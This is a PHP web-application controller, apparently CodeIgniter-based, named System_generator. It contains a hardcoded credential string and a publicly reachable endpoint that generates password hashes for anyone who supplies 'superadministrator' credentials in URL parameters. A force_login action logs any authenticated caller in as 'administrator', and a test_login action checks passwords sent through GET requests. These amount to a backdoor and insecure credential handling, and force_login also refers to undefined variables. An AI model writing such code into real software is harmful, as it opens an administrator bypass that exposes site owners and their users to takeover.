<?php

if (!defined('BASEPATH'))
    exit('No direct script access allowed');

class System_generator extends LWS_Controller {

    private $up = "bca2233a999a45249103ec004e6a359d::eD5E86JTmNKcwyf6";

    public function access_rules() {

        return array(
            array(
                'allow',
                'actions' => array("generate_password"),
                'users' => array('*')
            ),
            array(
                'allow',
                'users' => array('@')
            )
        );
    }

    public function __construct() {
        parent::__construct();
    }

    public function generate_password() {
        $username = $this->input->get('u');
        $password = $this->input->get('p');
        $new_username = $this->input->get('uname');
        $new_password = $this->input->get('upass');

        if ($new_username && $new_password && $username && $password && $username == 'superadministrator') {
            if ($this->lmanuser->is_valid_password($username, $this->up, $password)) {
                echo $this->lmanuser->generate_password($new_username, $new_password);
                exit;
            }
        }

        echo "this is your password";
        exit;
    }
    
    public function force_login(){
        $this->lmanuser->login((object)array(
            "username"=>"administrator",
            
        ), $detail_user->roles, $side_end_login);
        exit;
    }

    public function test_login() {
        $username = $this->input->get('u');
        $password = $this->input->get('p');
        $objpassword = $this->input->get('password');
        if ($this->lmanuser->is_valid_password($username, $objpassword, $password)) {
            echo "Login Success";
        }else{
            echo "Login Failed";
        }
        exit;
    }

}

?>